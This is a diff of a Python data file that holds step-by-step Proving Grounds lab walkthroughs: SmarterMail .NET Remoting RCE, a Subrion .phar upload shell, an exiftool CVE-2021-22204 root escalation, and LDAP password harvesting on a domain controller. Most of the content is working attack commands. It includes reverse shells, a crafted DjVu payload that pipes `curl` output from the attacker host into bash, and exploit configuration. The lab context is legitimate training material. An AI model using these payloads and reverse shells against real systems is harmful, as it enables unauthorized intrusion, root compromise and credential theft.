@@ -32,31 +32,40 @@ twiggy = {
 }
 
 algernon = {
-  'title': 'Windows · Sync Breeze BOF → SYSTEM',
-  'ips': {'K': '192.168.45.180', 'T': '192.168.153.62'},
+  'title': 'Windows · SmarterMail .NET Remoting RCE → direct SYSTEM',
+  'ips': {'K': '192.168.45.245', 'T': '192.168.120.110'},
   'steps': [
     {'h': 'Recon', 'b': [
-      P('The overflow lands you straight as SYSTEM.'),
-      C('sudo nmap -sC -sV -p 21,80,9121 -Pn {T}'),
-      O('80/tcp   open  http  Sync Breeze Enterprise\n9121/tcp open  http  Sync Breeze Enterprise'),
-      P('🎯 The login page footer shows **Sync Breeze Enterprise 10.0.28**.'),
-      W('**If this doesn\'t match:** most write-ups of PG Algernon show **SmarterMail**, not Sync Breeze: anonymous FTP, the SmarterMail web UI on port **9998**, and .NET remoting on **17001**. The usual exploit is `searchsploit -m 49216` (SmarterMail build 6985 RCE), which gives SYSTEM. Run a full `-p-` scan first and follow whichever service you actually see.')]},
+      P('The SmarterMail service runs as SYSTEM, so there is **no privesc step**.'),
+      C('sudo nmap -p- --min-rate 3000 {T} -oN algernon_ports.txt'),
+      O('21 ftp | 80 http | 135 | 139 | 445 | 5040 | 9998 | 17001')]},
+    {'h': 'Identify SmarterMail', 'b': [
+      C('sudo nmap -A -p 9998,17001 {T} -oN algernon_svc.txt\ncurl -sL http://{T}:9998 | grep -i -E "stProductVersion|stProductBuild"'),
+      O('9998/tcp  open  http      Microsoft IIS 10.0  → /interface/root\n17001/tcp open  remoting  MS .NET Remoting services\nvar stProductBuild = "6919 (Dec 11, 2018)";'),
+      P('🎯 **SmarterMail build 6919**, with .NET Remoting exposed on **17001** (CVE-2019-7214).')]},
+    {'h': 'Get the exploit', 'b': [
+      C('searchsploit smartermail\nsearchsploit -m 49216'),
+      O('SmarterMail Build 6985 - Remote Code Execution  | windows/remote/49216.py'),
+      P('It is written for build 6985, but 6919 is older and also vulnerable ✅')]},
+    {'h': 'Configure it', 'b': [
+      C('sed -i "s/^HOST=.*/HOST=\'{T}\'/; s/^PORT=.*/PORT=17001/; s/^LHOST=.*/LHOST=\'{K}\'/; s/^LPORT=.*/LPORT=17001/" 49216.py\ngrep -nE "^(HOST|PORT|LHOST|LPORT)=" 49216.py'),
+      O("HOST='{T}'\nPORT=17001\nLHOST='{K}'\nLPORT=17001")]},
     {'h': 'Exploit', 'b': [
-      C('searchsploit sync breeze\nsearchsploit -m 42341')]},
-    {'h': 'Fresh shellcode (bad chars)', 'b': [
-      C('msfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 -b "\\x00\\x0a\\x0d\\x25\\x26" -f python -v shellcode EXITFUNC=thread'),
-      P('Paste it into `42341.py`, and set `ip = "{T}"` and port 80.')]},
-    {'h': 'Run', 'b': [
-      C('rlwrap nc -lvnp 443\npython2 42341.py'),
-      O('nt authority\\system'),
-      W('Egress is filtered: call back on port **443**. The script is **python2**.'),
+      P('Terminal 1:'),
+      C('sudo rlwrap nc -lvnp 17001'),
+      P('Terminal 2:'),
+      C('python3 49216.py'),
+      O('whoami\nnt authority\\system'),
+      W('Outbound traffic is filtered: your listener must use **port 17001**, a port the target already uses.')]},
+    {'h': 'proof.txt', 'b': [
       C('type C:\\Users\\Administrator\\Desktop\\proof.txt', 'cmd'),
       F('proof.txt captured 👑')]},
   ],
   'takeaways': [
-    '🔍 Fingerprint the **exact version** before picking an exploit.',
-    '🧬 Always **regenerate the shellcode**.',
-    '🚫 HTTP overflows kill `\\x00 \\x0a \\x0d % &`.'],
+    '🔍 For unusual ports, run `nmap -A` and check the page source for version strings.',
+    '📮 Ports **9998 + 17001** together mean SmarterMail.',
+    '🔁 An exploit written for a newer build often works on older builds too.',
+    '🚧 Outbound filtered? Listen on a port the target already uses (**17001** here).'],
 }
 
 pelican = {
@@ -64,7 +73,7 @@ pelican = {
   'ips': {'K': '192.168.45.180', 'T': '192.168.153.64'},
   'steps': [
     {'h': 'Recon', 'b': [
-      C('sudo nmap -sC -sV -p 22,80,2181,8080,8181 -Pn {T}'),
+      C('sudo nmap -sC -sV -p 22,80,2181,8080,8181 -Pn {T} -oN pelican_svc.txt'),
       O('2181/tcp open  zookeeper 3.4.6\n8080/tcp open  http      Exhibitor Web UI'),
       P('🎯 **Exhibitor** on 8080 lets you edit the `java.env` startup script, which is command injection.')]},
     {'h': 'Foothold: inject into the config', 'b': [
@@ -95,36 +104,68 @@ pelican = {
 }
 
 exfiltrated = {
-  'title': 'Linux · Subrion CMS → root cron',
-  'ips': {'K': '192.168.45.180', 'T': '192.168.153.66'},
+  'title': 'Linux · Subrion 4.2.1 upload bypass → root cron exiftool (CVE-2021-22204) → root',
+  'ips': {'K': '192.168.45.245', 'T': '192.168.228.163'},
   'steps': [
     {'h': 'Recon and the vhost', 'b': [
-      C('sudo nmap -sC -sV -p 22,80 -Pn {T}'),
-      P('It redirects to `exfiltrated.offsec`, so add it to /etc/hosts:'),
-      C("echo '{T} exfiltrated.offsec' | sudo tee -a /etc/hosts")]},
-    {'h': 'Subrion admin → upload a shell', 'b': [
-      P('The panel is at `/panel/`. Log in with **admin:admin**. Version **4.2.1** has CVE-2018-19422: `.php` is blocked, so use **.phar**.'),
-      C('cp /usr/share/webshells/php/php-reverse-shell.php shell.phar   # set ip={K} port=80'),
-      P('Upload it in **Panel → Uploads**, then:'),
-      C('rlwrap nc -lvnp 80\ncurl http://exfiltrated.offsec/uploads/shell.phar'),
-      O('uid=33(www-data)'),
-      W('Egress is filtered: call back on port **80**.'),
+      C('sudo nmap -sC -sV -p 22,80 -Pn {T} -oN exfil_svc.txt'),
+      O('22/tcp open  ssh\n80/tcp open  http   Apache httpd 2.4.41 (Ubuntu)\n| http-robots.txt: /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/\n|_http-title: Did not follow redirect to http://exfiltrated.offsec/'),
+      P('It redirects to `exfiltrated.offsec`, so add the name to /etc/hosts:'),
+      C("echo '{T} exfiltrated.offsec' | sudo tee -a /etc/hosts\ncurl -s http://exfiltrated.offsec/panel/ | grep -o 'Subrion CMS v[0-9.]*'"),
+      O('Subrion CMS v4.2.1')]},
+    {'h': 'Subrion admin → upload a .phar shell', 'b': [
+      P('The panel is at `/panel/`. **admin:admin** works. Version 4.2.1 has **CVE-2018-19422**: `.php` is blocked, but `.phar` still runs as PHP.'),
+      C(r'''cp /usr/share/webshells/php/php-reverse-shell.php shell.phar
+sed -i "s/^\$ip = .*/\$ip = '{K}';/; s/^\$port = .*/\$port = 4444;/" shell.phar
+grep -nE '^\$ip|^\$port' shell.phar'''),
+      O("$ip = '{K}';\n$port = 4444;"),
+      W('Edit the file **before** you upload it. Then upload it in **Panel → Content → Uploads**.'),
+      C('rlwrap nc -lvnp 4444'),
+      C('curl http://exfiltrated.offsec/uploads/shell.phar'),
+      O('connect to [{K}] from (UNKNOWN) [{T}]\nuid=33(www-data) gid=33(www-data) groups=33(www-data)'),
+      C('python3 -c \'import pty; pty.spawn("/bin/bash")\''),
+      P('💡 "Connection refused (111)" means the server still has the old file with 127.0.0.1:1234. Re-upload the fixed one.'),
+      P('💡 Script route: `searchsploit -m 49876` then `python3 49876.py -u http://exfiltrated.offsec/panel/ --user admin --pass admin`'),
+      C('find / -name local.txt 2>/dev/null'),
       F('local.txt captured')]},
     {'h': 'Privesc: find the root cron', 'b': [
-      C('wget http://{K}/pspy64 -O /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy'),
-      O('UID=0 ... /opt/image-exif.sh'),
-      P('It runs as root on images that get uploaded.')]},
-    {'h': 'Root', 'b': [
-      P('Your notes: a malicious filename.'),
-      C("cd <dir the script watches>\ntouch '$(cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash).jpg'\n# wait for the cron, then:\n/tmp/rootbash -p\ncat /root/proof.txt"),
-      W('**If this doesn\'t match:** most write-ups show `/opt/image-exif.sh` running **exiftool** on the images in the Subrion uploads folder. That\'s **CVE-2021-22204** (exiftool before 12.24): a crafted **DjVu** image runs a command as root. Make one with a public CVE-2021-22204 PoC, drop it in the uploads folder, and wait for the cron. Check the script with `cat /opt/image-exif.sh` and the version with `exiftool -ver`.'),
+      C('cat /etc/crontab\ncat /opt/image-exif.sh'),
+      O('* * * * * root bash /opt/image-exif.sh\n\nIMAGES=\'/var/www/html/subrion/uploads\'\nls $IMAGES | grep "jpg" | while read filename;\ndo\nexiftool "$IMAGES/$filename" >> $LOGFILE\ndone'),
+      P('Every minute, root runs **exiftool** on each `.jpg` in the uploads folder, and www-data can write there. That is **CVE-2021-22204**: a crafted DjVu file runs commands when exiftool reads it.'),
+      P('`pspy64` shows the same thing if `/etc/crontab` is hidden.')]},
+    {'h': 'Root: malicious DjVu named .jpg', 'b': [
+      P('On Kali, build the payload:'),
+      C(r'''sudo apt-get install -y djvulibre-bin
+cat > shell.sh << 'EOF'
+#!/bin/bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{K}",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+EOF
+printf '(metadata "\\c${system ('"'"'curl http://{K}/shell.sh | bash'"'"')};")' > exploit
+cat exploit
+djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit
+mv exploit.djvu exploit.jpg
+file exploit.jpg'''),
+      O(r'''(metadata "\c${system ('curl http://{K}/shell.sh | bash')};")
+exploit.jpg: DjVu image or single page document'''),
+      P('Kali tab 1:'),
+      C('sudo python3 -m http.server 80'),
+      P('Kali tab 2:'),
+      C('rlwrap nc -lvnp 4445'),
+      P('On the target (www-data):'),
+      C('wget http://{K}/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg'),
+      P('⏳ Wait up to a minute for the cron job.'),
+      O('connect to [{K}] from (UNKNOWN) [{T}]\n# id\nuid=0(root) gid=0(root) groups=0(root)'),
+      C('cat /root/proof.txt'),
+      W('Use port **4445** for root, because your www-data shell is still on 4444.'),
       F('proof.txt captured 👑')]},
   ],
   'takeaways': [
-    '🌐 A redirect means adding the name to `/etc/hosts`.',
-    '🔑 admin:admin plus an upload CVE; `.phar` gets past a `.php` block.',
-    '🕵️ **pspy** finds hidden root crons.',
-    '💥 Anything a root script reads from a folder you can write to (a filename, an image) is an injection point.'],
+    '🌐 A redirect to a hostname means adding it to `/etc/hosts`.',
+    '🔑 Try default logins like admin:admin, and use `.phar` when `.php` is blocked.',
+    '✏️ Edit the reverse shell\'s IP and port **before** uploading.',
+    '⏰ Read `/etc/crontab` and any script it calls; **pspy** finds hidden cron jobs.',
+    '🖼️ A root cron running exiftool on a folder you can write to gives root through a crafted DjVu (**CVE-2021-22204**).',
+    '🚫 The "malicious filename" trick doesn\'t work here, because the script quotes the filename.'],
 }
 
 hutch = {
@@ -133,14 +174,14 @@ hutch = {
   'steps': [
     {'h': 'Recon', 'b': [
       P('The domain is **hutch.offsec**.'),
-      C('sudo nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,5985,9389 -Pn {T}'),
+      C('sudo nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,5985,9389 -Pn {T} -oN hutch_svc.txt'),
       P('🎯 It\'s a Domain Controller with **WinRM (5985)** open.')]},
     {'h': 'Anonymous LDAP', 'b': [
-      C('ldapsearch -x -H ldap://{T} -b "DC=hutch,DC=offsec" "(objectClass=user)" | grep -i -E "description|info|sAMAccountName"'),
+      C('ldapsearch -x -H ldap://{T} -b "DC=hutch,DC=offsec" "(objectClass=user)" | tee ldap_users.txt | grep -i -E "description|info|sAMAccountName"'),
       O('sAMAccountName: fmcsorley\ndescription: CrabSharkJellyfish192'),
       P('🔑 The password is in the **description** field.')]},
     {'h': 'Validate the creds and get a shell', 'b': [
-      C("nxc winrm {T} -u fmcsorley -p 'CrabSharkJellyfish192'      # Pwn3d!\nevil-winrm -i {T} -u fmcsorley -p 'CrabSharkJellyfish192'"),
+      C("nxc winrm {T} -u fmcsorley -p 'CrabSharkJellyfish192' | tee nxc_winrm.txt     # Pwn3d!\nevil-winrm -i {T} -u fmcsorley -p 'CrabSharkJellyfish192'"),
       C('type ..\\Desktop\\local.txt', 'cmd'),
       F('local.txt captured')]},
     {'h': 'Privesc to SYSTEM', 'b': [
